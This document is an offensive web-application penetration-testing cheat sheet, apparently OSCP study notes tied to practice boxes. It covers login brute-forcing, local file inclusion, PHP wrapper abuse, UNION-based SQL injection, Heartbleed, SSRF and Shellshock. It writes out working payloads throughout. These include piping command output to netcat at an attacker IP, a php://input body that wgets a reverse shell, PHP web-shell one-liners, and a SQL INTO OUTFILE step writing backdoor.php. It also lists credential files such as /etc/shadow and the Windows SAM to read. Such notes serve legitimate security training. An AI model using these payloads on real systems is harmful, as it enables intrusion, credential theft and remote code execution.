# Brute Force Login Screens
- Generally doesn't work but should be tried anyways in case it's low hanging fruit. 
- It is more likely to be successful if we already have some usernames that will likely work. 
- General usernames and passwords should also be tried but we can't have this list be too long because it will take time. 

1. Turn on proxy (Burp or ZAP) and capture requests. 
2. Attempt a general login. 
3. Look at the request being sent to identify the method (GET or POST) to send the authentication credentials as well as the variable name for the username and password.
4. See what keyword is displayed upon a failed login attempt.
5. Create or use a list of usernames to attempt brute force login. [Default Username List](https://github.com/neogeo56/OSCP/blob/master/Web/Brute_Force/Default-Usernames.txt)
6. Create or use a list of passwords to attempt brute force login. [Default Password List](https://github.com/neogeo56/OSCP/blob/master/Web/Brute_Force/rockyou-20.txt)
7. Create a colon-seperated file of username and password combinations using the [UserPass_List_Maker.py](https://github.com/neogeo56/OSCP/blob/master/Web/Brute_Force/UserPass_List_Maker.py)
```
python3 UserPass_List_Maker.py [user list] [password list]
```
- Creates the colon-seperated file "User_Pass.txt" in the directory the script was run from.
8. Brute force login screen with [Web_Brute_Force_2.py](https://github.com/neogeo56/OSCP/blob/master/Web/Brute_Force/Web_Brute_Force_2.py) python script.
```
python3 Web_Brute_Force_2.py -f/--file [colon seperated username:password file] -U/--URL [URL to the web application login form] -k/--keyword [Keyword in the HTML used to identify failed login attempts] -uP [HTTP parameter that passes the username] -pP [HTTP parameter that passes the password] -o [outfile location]
```

# Local File Inclusion Test

## Evaluate Open Home Directories
Apache by default creates a home directory for each user account and sometimes these home directories are accessible through web page navigation. 
1. Compile a listing of usernames or guessed usernames. 
2. In the web browser just attempt accessing home directories: 
```
[IP Address / Hostname]/~[username]
```

## Directory Traversal
In areas of the application where we see directories hardcoded into the web address bar, we should try directory traversal attacks to see if we can navigate to any file on the system. 
### Xnix 
```
Http(s)://[web address]?[variable]=../../../../../../../../../../../../../../../../../[file location like etc/passwd or etc/resolve.conf]
```
- Try with no extension and then try with common extensions like .htm or .html or .txt 
- Also try to delete pre-filled extensions (txt, php, etc.) to see if we can get a verbose error message to pull threads on. 
### ISS / Windows 
```
Http(s)://[web address]?[variable]=../../../../../../../../../../../../../../../../../[file location like \%systemroot%\system32\config] 
```
### Valuable File Locations To Read w/ LFI
- SSH Key locations if Port 22 is open. 
```
Var/log/auth.log 
```
- OS files for passwords. 
```
/etc/passwd
```
```
/etc/shadow
```
  - Generally can't read this unless the permissions to it are missconfigured.  If we can read this then we usually can read anything and it's over.
- Log poisoning
```
var/log/apace2/access.log
```
- Windows Files
```
%windir%\repair\sam 
%windir%\System32\config\RegBack\SAM 
%windir%\repair\system 
%windir%\repair\software 
%windir%\repair\security 
%windir%\debug\NetSetup.log (AD domain name, DC name, internal IP, DA account) 
%windir%\iis6.log (5,6 or 7) 
%windir%\system32\logfiles\httperr\httperr1.log 
C:\sysprep.inf 
C:\sysprep\sysprep.inf 
C:\sysprep\sysprep.xml 
%windir%\Panther\Unattended.xml 
C:\inetpub\wwwroot\Web.config 
%windir%\system32\config\AppEvent.Evt (Application log) 
%windir%\system32\config\SecEvent.Evt (Security log) 
%windir%\system32\config\default.sav 
%windir%\system32\config\security.sav 
%windir%\system32\config\software.sav 
%windir%\system32\config\system.sav 
%windir%\system32\inetsrv\config\applicationHost.config 
%windir%\system32\inetsrv\config\schema\ASPNET_schema.xml 
%windir%\System32\drivers\etc\hosts (dns entries) 
%windir%\System32\drivers\etc\networks (network settings) 
%windir%\system32\config\SAM (only really useful if you have access to the files while the machine is off) 
```

## PHP Wrappers
- If within an HTTP request a .php file is shown or exposed, then you should attempt techniques below to flex the secure coding of PHP on the webserver. 
- When attempting these tests, look at the response through a web proxy as sometimes exploitation won't show up in the HTML.
- If we have command injection but it's blind, we can pipe the output to a nc session connecting back to the attacker IP that we're listening on.
```
[command]|nc [attacker IP] [port]
```
  - ippsec=Sense
### php://filter
1. Attempt a PHP wrapper filter function around a PHP file location we know renders in the webpage to identify if the PHP is vulnerable to leaking PHP source code.
```
...[file].php?[variable/page]=php://filter/convert.base64-encode/resource=[known file location that renders]
```
  - You shouldn't include the PHP extension in the URL because this command can only execute on php extension files of the web server because you are abusing a PHP command already.
2. If successful, the base64 output of the PHP file is shown, which we can then copy to our attacker box and decode to read the plaintext version of any PHP file.
### expect://LFI
- Allows execution of system commands via the php expect wrapper.
- This functionality is not enabled by default.
1. Attempt the PHP wrapper expect function in the URL executing a known system command (ls).
```
...[file].php?[variable/page]=expect://[command]
```
- You will received the following error if the expect functionality is disabled on the target.
```
Warning: include(): Unable to find the wrapper "expect" ...
```
### php://input
- Your payload is sent in a POST request body.  So, usage of Burp / ZAP is best for this exploit.
- Usage of wget / curl to download a PHP script to the target is probably the easiest method.
1. Modify the URL in the POST Request Header to include the input function.
```
...?[variable/page]=php://input
```
2. Input the PHP command in the body of the POST Request.
```
<? system('wget http://[attacker IP]/[perl reverse shell script].php -O [target file location like /var/www/shell.php');?>
```
3. After upload of the script to the box, execute the reverse shell by simply navigating to the uploaded file location.
```
http://[target IP]/[uploaded file location]
```
### .php?file=remote location (ippsec=Poison)
1. Create a reverse shell through a python HTTP server on port 80.
2. Attempt to read a file hosted on the attacker box through the URL.
```
...[file].php?file=http://[attacker IP]/[remote file].[extension]
```
## Identify any PHP 'include' Functions
- The 'include()' function in PHP code is used to open files based on user input / variables.
- This function is commonly used insecurely in that if input is not sanitized appropriately, a user can force the web browser to automatically execute any PHP code that they point the web browser to on the target box.
- If we can upload a PHP reverse shell to any location on the target box, we can abuse the 'include()' function LFI to execute the reverse shell back to our attacker machine.
  - A simple PHP command injection file that we can create allows us to input whatever command we want into an HTTP request to have it executed as long as another part of the HTTP request is navigating to this PHP file on the web server box and abusing the 'include' functionality.
  ```
  <?php echo system ($_REQUEST['neogeo']); ?>
  ```
  ```
  GET /?neogeo=[cmd]
  ```
  - A reliable PHP reverse shell can be found here [PHP Reverse Shell](https://github.com/neogeo56/OSCP/blob/master/Shells/php-reverse-shell.php).  Note that you have to adjust the IP and port variables in the shell before executing.
  
# Manual SQL Injection Testing
- Syntax varies between DB types - cheat sheets available here: http://pentestmonkey.net/category/cheat-sheet/sql-injection 
1. Identify areas in the application that could be inputs for SQLi in the URL (id=1). 
2. Proxy through ZAP to try [SQLi Test Payloads](https://github.com/neogeo56/OSCP/blob/master/Web/SQLi_Tests_Plaintext) to see instances where the payload doesn't result in an error on the page (the website is processing the SQLi payload correctly to result in TRUE condition). 
3. Identify the number of columns in the current table by adding an additional value for each request (1 then 1,2 then 1,2,3).
```
.... ORDER BY 1,2,3,4,5,6.... 
```
4. Once you get to a number that results in an error on the page, the total number of columns is less than the number that resulted in the error (if it errored out on 7, then there are 6 columns in the current table).
5. Identify which columns show information on the screen. 
```
... UNION ALL SELECT 1,2,3,4,5,6 
```
- Which numbers of 1 - 6 show on the page is where we are going to put the query part of the payload (We'll use 3 for rest of example) 
6. Fingerprint the DB 
```
... UNION ALL SELECT 1,2,[version payload],4,5,6 
```
7. Identify current user you're issuing commands for 
```
.... UNION ALL SELECT 1,2,[current user payload],4,5,6 
```
8. List the current datbase you're working in 
```
... UNION ALL SELECT 1,2,[current database payload],4,5,6 
```
9. List all of the databases available in the current view (assuming MySQL for the rest - check cheat sheet for syntax) 
```
... UNION ALL SELECT 1,2,[schema_name],4,5,6 FROM [information_schema.schemata] 
```
10. List the tables available in the current database 
```
... UNION ALL SELECT 1,2,[table_name],4,5,6 FROM [information_schema.tables] 
```
11. Identify a table of interest that has account information. Then list the columns available in the that table 
'''
... UNION ALL SELECT 1,2,[column_name],4,5,6 FROM [information_schema.columns] WHERE [table_name=[table of interest]] 
'''
  - Note that you might have to convert the table name to ASCII Character values to make this work. char(65,66,67) means ABC 
12. Output the contents of columns from a table. 
```
... UNION ALL SELECT 1,2,[column_name],4,5,6 FROM [table of interest] 
```
13. PHP reverse shell attempt 
```
union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6 into OUTFILE 'c:/inetpub/wwwroot/backdoor.php' 
```
14. Load File Attempt 
```
union all select 1,2,3,4,load_file("c:/windows/system32/drivers/etc/hosts"),6 
```

# Heartbleed (ippsec:Valentine)
## Background
- OpenSSL 1.0.1 through 1.0.1f (inclusive) are vulnerable. 
- OpenSSL 1.0.1g is NOT vulnerable.
- OpenSSL 1.0.0 branch is NOT vulnerable.
- OpenSSL 0.9.8 branch is NOT vulnerable.

## Exploit
```
MSF > use auxiliary/scanner/ssl/openssl_heartbleed 
MSF > set RHOSTS [IP]
MSF > set verbose true 
MSF > run 
```
- Try to connect to the port using the HTTP protocol instead of HTTPS as sometimes websites serve different content based on the protocol used to connect to the port / web application.

# Unknown Web Application (ippsec: Nibbles)
1. Banner grab the service running on the web port.
2. Google the name of the platform and find the most current version of it.
3. Download the application code release (not from GitHub as it is generally not the most recent version).
4. Find file locations within that application file structure that lists the version of the web application.  Leverage GREP and AWK to help with this.
5. Attempt to navigate to the file locations that could list a version number from the URL of the web application.
6. Searchsploit the web application and version numebr to see if there are any exploits available.
7. Check the installation guides for the web application (and version if they differ by version) for default credentials.

## SSRF (ippsec:Kotarak)
### Background
- Server Side Request Forgery: When you use the target web server as a proxy to access other systems inside the company or outside the company.
### Exploit
1. Identify a server that has the ability to redirect to other servers remotely based on our input.
2. Test that it is vulnerable to SSRF by running a python web server on the attacker box and then instructing the target web server to reach out to your attacker python web server. If you see CLI entries on the attacker box, then the target web server is vulnerable to SSRF.
3. Run a local port scan of the target server.
```
http://localhost:[port / port range]
```
  - You can use ZAP to cycle through each port number and the filter the responses by body size to identify the ports that are open on the localhost that you can navigate to through SSRF.
  - Wfuzz can also be leveraged to do this.

# PHPLiteAdmin (ippsec:Nineveh)
- Common way to is to upload any text and then add a .php extension on it to make it executable.
- More information on how to do this exploit is in searchsploit record /exploits/php/webapps/24044.txt.
1. Create new database with 1 field. 
2. In the field, put PHP code with PHP tags.  Might have to use a single or a double quotes in the one-liner to make it work.  Best to test this out with a simple command injection rather than going straight for a reverse shell.  Good example script to use is:  
```
<?php echo system ($_REQUEST['teststring']); ?>
```
3. Change the Type to Text for the field.
4. Rename the database to a name with the extension of .php.
5. This gives us an opportunity to inject shellcode which can be executed with an LFI vulnerability on the web page to run the code.  If we execute with LFI, we just have to direct to the location of the database and then add a parameter (teststring) to inject whatever command we want.
```
...?variable=[location of renamed DB from step 4].php&teststring=[command]
```
6. Once you've confirmed that command execution exists, then we can move onto a reverse shell script (can be any reverse shell â€“ not just a PHP one because we have direct OS command injection).

# Content Management Systems (CMS)
- Usually have default creds like admin:admin.
- With Admin access:
  - Look for editing Themes, Plugins, File Uploads, Folders, or Backups as these functions almost always run PHP code to get code execution.  If we can't do things like edit and save these functions, then our access is likely read-only (even if we're admin) and not able to get code execution.

# Shellshock
## Background
- CVE-2014-7169, 6277, 7186, 7187
- Flaw in the way that Bash handled functions being defined within the environmental variables and exported them.
- Adversary identifies areas where input from attacker is used in a Bash environmental variable.

## Exploit
Attempt these exploit strings within HTTP Request Headers as that is the most common place vulnerable CGI Environmental Variables are located in web applications.
1. Non-blind Injection
```
() { 1010;};echo;[full path to command]
```
  - /usr/bin/id
  - /bin/cat /etc/passwd
2. Blind Injection
```
() { 1010;};echo;ping -c 1 [attacker IP]
```
  - Need to have a python webserver running on the attacker machine on port 80.
